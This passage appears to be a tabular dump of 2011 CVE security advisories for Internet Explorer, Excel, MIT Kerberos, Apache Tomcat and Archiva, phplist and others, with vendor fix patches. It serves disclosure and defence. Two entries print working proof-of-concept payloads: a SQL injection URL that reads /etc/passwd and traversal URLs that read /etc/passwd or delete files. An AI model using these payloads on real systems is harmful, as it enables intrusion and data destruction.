http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/research-vuln.php
http://www.vupen.com/english/advisories/2011/0950
http://www.microsoft.com/technet/security/Bulletin/MS11-032.mspx
X. DISCLOSURE TIMELINE
-----------------------------
2011-03-02 - Vulnerability Discovered by VUPEN
2011-04-12 - MS11-032 security update available"
12733,VUPEN Security Research - Microsoft Office Excel Real Time Data Stack Overwrite Vulnerability (CVE-2011-0105),,CVE-2011-0105,"VUPEN Security Research - Microsoft Office Excel Real Time Data Stack Overwrite Vulnerability (CVE-2011-0105)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and format
spreadsheets, and analyze and share information to make more informed
decisions. With the Microsoft Office Fluent user interface, rich data
visualization, and PivotTable views, professional-looking charts are easier
to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by a stack overwrite error when parsing the RTD
RealTimeData record (0813h), which could be exploited by attackers to
compromise a vulnerable system by tricking a user into opening a specially
crafted Excel document.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2008 for Mac
Microsoft Office 2004 for Mac
Microsoft Excel 2002 Service Pack 3
Open XML File Format Converter for Mac
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
To proactively protect critical networks and infrastructures against unpatched
vulnerabilities and reduce risks related to zero-day attacks, VUPEN shares its
vulnerability research with governments and organizations members of the VUPEN
Threat Protection Program (TPP).
VUPEN TPP customers receive fully detailed and technical reports about security
vulnerabilities discovered by VUPEN and in advance of their public disclosure.
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply the MS11-021 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/research-vuln.php
http://www.vupen.com/english/advisories/2011/0940
http://www.microsoft.com/technet/security/Bulletin/MS11-021.mspx
X. DISCLOSURE TIMELINE
-----------------------------
2010-10-10 - Vulnerability Discovered by VUPEN
2011-04-12 - MS11-021 security update available"
12734,VUPEN Security Research - Microsoft Internet Explorer Property Change Memory Corruption (CVE-2011-1345),,CVE-2011-1345,"VUPEN Security Research - Microsoft Internet Explorer Property Change Memory
Corruption (CVE-2011-1345)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error in the
""CObjectElement::OnPropertyChange()"" function within the MSHTML library
when handling objects, which could be exploited by remote attackers to
compromise a vulnerable system by tricking a user into visiting a specially
crafted web page.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 with SP2 for Itanium-based Systems
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2008 for 32-bit Systems
Microsoft Windows Server 2008 for 32-bit Systems Service Pack 2
Microsoft Windows Server 2008 for x64-based Systems
Microsoft Windows Server 2008 for x64-based Systems Service Pack 2
Microsoft Windows Server 2008 for Itanium-based Systems
Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2
Microsoft Windows 7 for 32-bit Systems
Microsoft Windows 7 for 32-bit Systems Service Pack 1
Microsoft Windows 7 for x64-based Systems
Microsoft Windows 7 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for x64-based Systems
Microsoft Windows Server 2008 R2 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for Itanium-based Systems
Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
To proactively protect critical networks and infrastructures against unpatched
vulnerabilities and reduce risks related to zero-day attacks, VUPEN shares its
vulnerability research with governments and organizations members of the VUPEN
Threat Protection Program (TPP).
VUPEN TPP customers receive fully detailed and technical reports about security
vulnerabilities discovered by VUPEN and in advance of their public disclosure.
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply the MS11-018 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/research-vuln.php
http://www.vupen.com/english/advisories/2011/0937
http://www.microsoft.com/technet/security/bulletin/MS11-018.mspx
X. DISCLOSURE TIMELINE
-----------------------------
2011-01-22 - Vulnerability Discovered by VUPEN
2011-04-12 - MS11-018 security update available"
12735,VUPEN Security Research - Microsoft Internet Explorer Layouts Use-after-free Vulnerability (CVE-2011-0094),,CVE-2011-0094,"VUPEN Security Research - Microsoft Internet Explorer Layouts Use-after-free Vulnerability (CVE-2011-0094)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Internet Explorer.
The vulnerability is caused by a use-after-free error in the
""CSpliceTreeEngine::InsertSplice()"" function within the MSHTML library
when handling layouts, which could be exploited by remote attackers to
compromise a vulnerable system by tricking a user into visiting a specially
crafted web page.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 with SP2 for Itanium-based Systems
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2008 for 32-bit Systems
Microsoft Windows Server 2008 for 32-bit Systems Service Pack 2
Microsoft Windows Server 2008 for x64-based Systems
Microsoft Windows Server 2008 for x64-based Systems Service Pack 2
Microsoft Windows Server 2008 for Itanium-based Systems
Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
To proactively protect critical networks and infrastructures against unpatched
vulnerabilities and reduce risks related to zero-day attacks, VUPEN shares its
vulnerability research with governments and organizations members of the VUPEN
Threat Protection Program (TPP).
VUPEN TPP customers receive fully detailed and technical reports about security
vulnerabilities discovered by VUPEN and in advance of their public disclosure.
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply the MS11-018 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/research-vuln.php
http://www.vupen.com/english/advisories/2011/0937
http://www.microsoft.com/technet/security/bulletin/MS11-018.mspx
X. DISCLOSURE TIMELINE
-----------------------------
2010-05-20 - Vulnerability Discovered by VUPEN
2011-04-12 - MS11-018 security update available"
12757,MITKRB5-SA-2011-004 kadmind invalid pointer free() [CVE-2011-0285],,CVE-2011-0285,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-004
MIT krb5 Security Advisory 2011-004
Original release: 2011-04-12
Last update: 2011-04-12
Topic: kadmind invalid pointer free()
CVE-2011-0285
CVSSv2 Vector: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 10
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
CVSSv2 Temporal Score: 7.8
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
The password-changing capability of the MIT krb5 administration daemon
(kadmind) has a bug that can cause it to attempt to free() an invalid
pointer under certain error conditions. This can cause the daemon to
crash or induce the execution of arbitrary code (which is believed to
be difficult). No exploit that executes arbitrary code is known to
exist, but it is easy to trigger a denial of service manually.
IMPACT
======
An unauthenticated remote attacker can cause the kadmind to terminate,
resulting in a denial of service. The attacker might be able to
remotely execute code on the host running kadmind, but exploiting the
freeing of an invalid pointer to execute arbitrary code is believed to
be difficult.
Some platforms detect attempted freeing of invalid pointers and
protectively terminate the process, preventing arbitrary code
execution on those platforms.
AFFECTED SOFTWARE
=================
* kadmind in MIT releases krb5-1.7 and later is vulnerable. Earlier
releases do not contain the functionality that the vulnerable code
implements.
FIXES
=====
* Workaround: restart the kadmind when it crashes, possibly using an
automated monitoring process.
* Upcoming releases in the krb5-1.7.x, krb5-1.8.x, and krb5-1.9.x
series will contain fixes.
* For the krb5-1.9 release, apply the following patch:
diff --git a/src/kadmin/server/schpw.c b/src/kadmin/server/schpw.c
index 1124445..0056885 100644
- --- a/src/kadmin/server/schpw.c
+++ b/src/kadmin/server/schpw.c
@@ -52,6 +52,7 @@ process_chpw_request(context, server_handle, realm, keytab,
ret = 0;
rep->length = 0;
+ rep->data = NULL;
auth_context = NULL;
changepw = NULL;
@@ -76,8 +77,13 @@ process_chpw_request(context, server_handle, realm, keytab,
plen = (*ptr++ & 0xff);
plen = (plen<<8) | (*ptr++ & 0xff);
- - if (plen != req->length)
- - return(KRB5KRB_AP_ERR_MODIFIED);
+ if (plen != req->length) {
+ ret = KRB5KRB_AP_ERR_MODIFIED;
+ numresult = KRB5_KPASSWD_MALFORMED;
+ strlcpy(strresult, ""Request length was inconsistent"",
+ sizeof(strresult));
+ goto chpwfail;
+ }
/* verify version number */
@@ -531,6 +537,10 @@ cleanup:
if (local_kaddrs != NULL)
krb5_free_addresses(server_handle->context, local_kaddrs);
+ if ((*response)->data == NULL) {
+ free(*response);
+ *response = NULL;
+ }
krb5_kt_close(server_handle->context, kt);
return ret;
This patch is also available at
http://web.mit.edu/kerberos/advisories/2011-004-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-004-patch.txt.asc
* For the krb5-1.8.x releases, the patch is available at
http://web.mit.edu/kerberos/advisories/2011-004-patch-r18.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-004-patch-r18.txt.asc
* For the krb5-1.7.x releases, use the patch for the krb5-1.8.x
releases, but apply ignoring whitespace differences (""patch -l"").
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-004.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2011-0285
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0285
http://krbdev.mit.edu/rt/Ticket/Display.html?id=6899
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=621726
ACKNOWLEDGMENTS
===============
This bug was initially reported to Debian by Felipe Ortega.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
The dispatch() function in kadmin/server/schpw.c (which handles the
password changing protocol) allocates an uninitialized krb5_data
structure for the response packet, expecting process_chpw_request() to
fill it in. There is remotely-inducible error one path through
process_chpw_request() that can return to dispatch() without
initializing the data pointer in the krb5_data structure that is to
hold the response packet, which will cause process_tcp_connection() in
lib/app-utils/net-server.c to free() an invalid pointer (via
kill_tcp_or_rpc_connection()). Password change requests that arrive
via UDP will not cause kadmind to free() an invalid pointer.
Releases krb5-1.7 and krb5-1.8 put some of the above-mentioned
functions in different source files, but the execution flow is largely
identical. Releases prior to krb5-1.7 did not have the TCP kpasswd
capability, and are not vulnerable.
REVISION HISTORY
================
2011-04-12 original release
Copyright (C) 2011 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAk2l6RMACgkQSO8fWy4vZo5bjgCgqnWVF2nixIkpdUPI1THkTgLn
h6cAn1bBnzjAxGA1fF56e7LNXPMZao+j
=9KKM
-----END PGP SIGNATURE-----"
12809,"phplist: cross site request forgery (CSRF), CVE-2011-0748",,CVE-2011-0748,"phplist: cross site request forgery (CSRF), CVE-2011-0748
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2748
http://int21.de/cve/CVE-2011-0748-phplist.html
Description
phplist is a mailing list software written in PHP.
Up to version 2.10.12, it provided no protection against cross site
request forgery (CSRF) at all, allowing a malicious attacker
controlling a webpage an admin visits at the time being logged into
phplist to gain full control over the phplist installation.
The vendor has released version 2.10.13, which fixes the vulnerability,
but somehow forgot to give any credit to the person reporting the
vulnerability to them.
Disclosure Timeline
2011-02-03: Vendor contacted
2011-02-10: Vendor releases 2.10.13 with fix
2011-04-07: Published advisory
This vulnerability was discovered by Hanno Boeck, http://www.hboeck.de,
of schokokeks.org webhosting."
12821,[SECURITY] CVE-2011-1475 Apache Tomcat information disclosure,,CVE-2011-1475,"CVE-2011-1475 Apache Tomcat information disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Tomcat 7.0.0 to 7.0.11
- Earlier versions are not affected
Description:
Changes introduced to the HTTP BIO connector to support Servlet 3.0
asynchronous requests did not fully account for HTTP pipelining. As a
result, when using HTTP pipelining a range of unexpected behaviours
occurred including the mixing up of responses between requests. While
the mix-up in responses was only observed between requests from the same
user, a mix-up of responses for requests from different users may also
be possible.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- Upgrade to a Tomcat 7.0.12 or later
- Switch to the NIO or APR/native HTTP connectors that do not exhibit
this issue
Credit:
This issue was identified by Brad Piles and reported via the public ASF
Bugzilla issue tracking system.
The Apache Tomcat security team requests that security vulnerability
reports are made privately to security tomcat apache org in the first
instance.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html"
12822,[SECURITY] CVE-2011-1183 Apache Tomcat security constraint bypass,,CVE-2011-1183,"CVE-2011-1183 Apache Tomcat security constraint bypass
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Tomcat 7.0.11
- Earlier versions are not affected
Description:
A regression in the fix for CVE-2011-1088 meant that security
constraints were ignored when no login configuration was present in the
web.xml and the web application was marked as meta-data complete.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- Upgrade to a Tomcat 7.0.12 or later
- Ensure a login configuration is defined in web.xml
Credit:
This issue was identified by the Apache Tomcat security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html"
12887,'Andy's PHP Knowledgebase' SQL Injection Vulnerability (CVE-2011-1546),,CVE-2011-1546,"'Andy's PHP Knowledgebase' SQL Injection Vulnerability (CVE-2011-1546)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in a_viewusers.php allowing for SQL injection of the 's' query parameter.
II. TESTED VERSION
---------------------------------------
0.95.2
III. PoC EXPLOIT
---------------------------------------
http://www.example.com/aphpkb/a_viewusers.php?s=1%20UNION%20SELECT%20load_file(0x2f6574632f706173737764),null,null,null,null,null,null%20limit%200
IV. SOLUTION
---------------------------------------
Upgrade to 0.95.3 or above.
V. REFERENCES
---------------------------------------
http://www.aphpkb.org/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1546
http://www.uncompiled.com/2011/03/cve-2011-1546/
VI. TIMELINE
---------------------------------------
03/13/2011 - Initial vendor disclosure
03/16/2011 - Vendor patched and released an updated version
03/16/2011 - Confirmed fix & disclosure date
03/30/2011 - Public disclosure"
13007,MITKRB5-SA-2011-003 [CVE-2011-0284] KDC double-free when PKINIT enabled,,CVE-2011-0284,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-003
MIT krb5 Security Advisory 2011-003
Original release: 2011-03-15
Last update: 2011-03-15
Topic: KDC vulnerable to double-free when PKINIT enabled
CVE-2011-0284
CVSSv2 Vector: AV:N/AC:M/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 9.3
Access Vector: Network
Access Complexity: Medium
Authentication: None
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
CVSSv2 Temporal Score: 7.3
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
The MIT Kerberos 5 Key Distribution Center (KDC) daemon is vulnerable
to a double-free condition if the Public Key Cryptography for Initial
Authentication (PKINIT) capability is enabled, resulting in daemon
crash or arbitrary code execution (which is believed to be difficult).
IMPACT
======
An unauthenticated remote attacker can induce a double-free event,
causing the KDC daemon to crash (denial of service), or to execute
arbitrary code. Exploiting a double-free event to execute arbitrary
code is believed to be difficult.
AFFECTED SOFTWARE
=================
The KDC in releases krb5-1.7 and later are vulnerable, if they are
configured to respond to PKINIT requests. Earlier releases did not
contain the vulnerable code. Additionally, third-party
preauthentication plugins that generate TYPED-DATA in the e-data field
of a KRB-ERROR message may be vulnerable.
FIXES
=====
* Upcoming releases in the krb5-1.7, krb5-1.8, and krb5-1.9 series
will contain fixes.
* Apply the following patch:
diff --git a/src/kdc/do_as_req.c b/src/kdc/do_as_req.c
index 46b5fa1..464cb6e 100644
- --- a/src/kdc/do_as_req.c
+++ b/src/kdc/do_as_req.c
@@ -741,6 +741,8 @@ prepare_error_as (struct kdc_request_state *rstate, krb5_kdc_req *request,
pad->contents = td[size]->data;
pad->length = td[size]->length;
pa[size] = pad;
+ td[size]->data = NULL;
+ td[size]->length = 0;
}
krb5_free_typed_data(kdc_context, td);
}
This patch is also available at
http://web.mit.edu/kerberos/advisories/2011-003-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-003-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-003.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2011-0284
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0284
ACKNOWLEDGMENTS
===============
This issue was discovered by Cameron Meadors of Red Hat.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
In do_as_req.c, the function perpare_error_as() attempts to decode the
e_data field both as preauth data and as typed data. If the e_data
contents are typed data, they are converted to preauth data. This
conversion can free pointers to the typed data items, and free them
again when cleaning up the preauth data during function exit.
REVISION HISTORY
================
2011-03-15 original release
Copyright (C) 2011 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAk1/qSUACgkQSO8fWy4vZo7g3gCfTiJoaxuB3yVIGKOkttvFJg2z
J2wAoPuSZ56AJ1ugZP0YzObbWVq4cWRt
=BJJb
-----END PGP SIGNATURE-----"
13022,[SECURITY] CVE-2011-1088 Apache Tomcat security constraint bypass,,CVE-2011-1088,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2011-1088 Apache Tomcat security constraint bypass
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.10
- - Earlier versions are not affected
Description:
When a web application was started, @ServletSecurity annotations were
ignored. This meant that some areas of the application may not have been
protected as expected.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- - Upgrade to a Tomcat version where this issue is fixed
- - Define security constraints via an alternative mechanism such as web.xml
Credit:
This issue was reported publicly on the Tomcat users mailing list.
The Apache Tomcat security requests that security vulnerability reports
are made privately to security tomcat apache org in the first instance.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJNfycmAAoJEBDAHFovYFnn3jgP/0aecIt4uUYHWbmzUPA0FNan
tzjVfPskwPYrSuNbHjHuxPknmxUPSFiCdO3V1LLtnCX2y5+cNancWRjLX7lDbt8H
sL+9AaoI8HDShG1wgYsnh/3fIKczhE28pTtyo0GtG4HpQVLcT/OH2Qhb6+mG3jwo
SCia1eSTJuhj5HM3n2fb5X33n/UEkX/cCALDrt1DRfKV69MaZbMiZh7XfpyVDpdN
LePYIeuOoxg9CVjkDYCVIaK5Bi0uzPD8yCc73dOU3YobgbDDaLSN7Awd1/RhO5TR
fpWVbl0gbmMlPnMy52B9qZL+H9HwcNnYPqbtpquE2a6ik29QT4LMTNo0mr25XxmP
K3Jb7VTcVb/P1pxFOsTyMWy25IFubMEBW4c3kafBZGUI3Q25QmNizBXZ5wvn1vex
kBzDZrnKmkzvhnCy6RnTKk9BYGRWEw9ImTqLOaLxmtXJw9bnWgoeusnje1k/24QI
3+pw/g5OjwG7hqtStrscFeo8tc/snXBojn1d21txsnLggQ0E6+9+vUVym5tBD16I
MfzN7FSd620AFSmVUo5mEfEpDe+RTkA8y/7BnYHoguBQ7WLlxejCgRpaf91vBns6
ZEQGntzx7EW7M+P2GNHy1mrVGTQ7Glk/5tnAFyqgMOHzYyN11Y3OWO1XBv+1um8q
kadENSXz4mY0vKtvaeuT
=i/HJ
-----END PGP SIGNATURE-----"
13086,'Quick Polls' Local File Inclusion & Deletion Vulnerabilities (CVE-2011-1099),,CVE-2011-1099,"'Quick Polls' Local File Inclusion & Deletion Vulnerabilities (CVE-2011-1099)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
Two vulnerabilities exist in 'Quick Polls' providing local file inclusion & local file deletion due to null-byte attacks against functions in index.php.
II. TESTED VERSION
---------------------------------------
1.0.1
III. PoC EXPLOITS
---------------------------------------
LFI: http://example.com/quickpolls/?fct=preview&p=../../../../../../../etc/passwd%00
LFD: http://example.com/quickpolls/?fct=delete&p=../../../../../../../tmp/foobar%00
IV. NOTES
---------------------------------------
* magic_quotes_gpc must be disabled for null-byte attacks to work
V. SOLUTION
---------------------------------------
Upgrade to 1.0.2 or above
VI. REFERENCES
---------------------------------------
http://www.focalmedia.net/create_voting_poll.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1099
http://www.uncompiled.com/2011/03/quick-polls-local-file-inclusion-deletion-vulnerabilities-cve-2011-1099/
VII. TIMELINE
---------------------------------------
02/05/2011 - Initial vendor disclosure
02/07/2011 - Vendor patched and released an updated version
02/07/2011 - Confirmed public disclosure date with vendor
03/06/2011 - Public disclosure"
13134,DDIVRT-2010-30 Alcatel-Lucent OmniVista 4760 NMS 'lang' Directory Traversal Vulnerability [ CVE-2011-0345 ],,CVE-2011-0345,"Title: DDIVRT-2010-30 Alcatel-Lucent OmniVista 4760 NMS 'lang' Directory Traversal Vulnerability [ CVE-2011-0345 ]
Severity: High
Date Discovered:10/29/2010
Discovered By: Digital Defense, Inc. Vulnerability Research Team
Additional Discovered By: r@b13$
Vulnerability Description:
The Alcatel-Lucent OmniVista 4760 NMS is vulnerable to a directory traversal. This flaw allows remote unauthenticated attackers to retrieve arbitrary files from a vulnerable system.
Solution Description:
Alcatel-Lucent has provided a patch for this vulnerability. The patch is available on the vendor's website. If you are unable to patch the system, mitigate this vulnerability by disabling the service, or restricting access to a local interface or a trusted network via a firewall or other means.
Tested Systems / Software:
OmniVista 4760 NMS version 5.0.07.05
OmniVista 4760 NMS version 5.1.06.03
Vendor Name: Alcatel-Lucent
Vendor Website: http://www.alcatel-lucent.com/"
13235,[SECURITY] CVE-2011-0533: Apache Archiva cross-site scripting vulnerability,,CVE-2011-0533,"CVE-2011-0533: Apache Archiva cross-site scripting vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Archiva 1.3.0 - 1.3.3
The unsupported versions Archiva 1.0 - 1.2.2 are also affected.
Description:
A request that included a specially crafted request parameter could be
used to inject arbitrary HTML or Javascript into the Archiva user
management page.
Mitigation:
Archiva 1.3.3 and earlier users should upgrade to 1.3.4
References:
http://archiva.apache.org/security.html
--
Brett Porter
brett apache org
http://brettporter.wordpress.com/
http://au.linkedin.com/in/brettporter"
13278,"VUPEN Security Research - Microsoft Internet Explorer ""mshtml.dll"" Dangling Pointer Vulnerability (CVE-2011-0036)",,CVE-2011-0036,"VUPEN Security Research - Microsoft Internet Explorer ""mshtml.dll"" Dangling Pointer Vulnerability (CVE-2011-0036)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Internet Explorer.
The vulnerability is caused by a dangling pointer in the ""mshtml.dll""
library when handling certain object manipulations, which could be exploited
by remote attackers to execute arbitrary code by tricking a user into
visiting a malicious web page.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
Microsoft Windows 7 (32-bit)
Microsoft Windows 7 (64x)
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 SP2 (Itanium)
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2008 (32-bit)
Microsoft Windows Server 2008 (32-bit) Service Pack 2
Microsoft Windows Server 2008 (64x)
Microsoft Windows Server 2008 (64x) Service Pack 2
Microsoft Windows Server 2008 (Itanium)
Microsoft Windows Server 2008 (Itanium) Service Pack 2
Microsoft Windows Server 2008 R2 (64x)
